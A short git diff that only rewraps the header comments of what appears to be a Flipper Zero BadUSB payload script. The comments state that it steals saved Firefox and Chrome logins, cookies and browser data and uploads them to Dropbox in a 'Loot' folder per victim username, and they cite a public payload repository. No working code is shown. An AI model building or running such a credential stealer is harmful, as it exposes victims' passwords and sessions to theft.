@@ -9,8 +9,9 @@
 #   ::: :::  ::::: ::  ::::: ::   ::  :::   ::   :: ::::     :::     ::   ::::: ::   ::   ::  :::: ::      ::     :: ::::  ::   :::  
 #    :: :: :   : :  :    : :  :    :   :::  :    : :: ::       :      :     : :  :   ::    :   :: : :       :     : :: ::    :   : :  
 #                                                                                                                                  
-#This script will grab Firefox and Chrome Saved Logins and Cookies along with Browser Data for Chrome, Edge, Firefox, and Opera then upload those to
-# DropBox in a new folder called Loot followed by a Folder named after the username the data came from
+# This script will grab Firefox and Chrome Saved Logins and Cookies along with Browser Data for 
+# Chrome, Edge, Firefox, and Opera then upload those to DropBox in a new folder called Loot followed
+# by a Folder named after the username the data came from
 #
 # The extraction of Browser History and Bookmarks was copied from I-Am-Jakoby's browserData.ps1 script 
 # https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-BrowserData/browserData.ps1
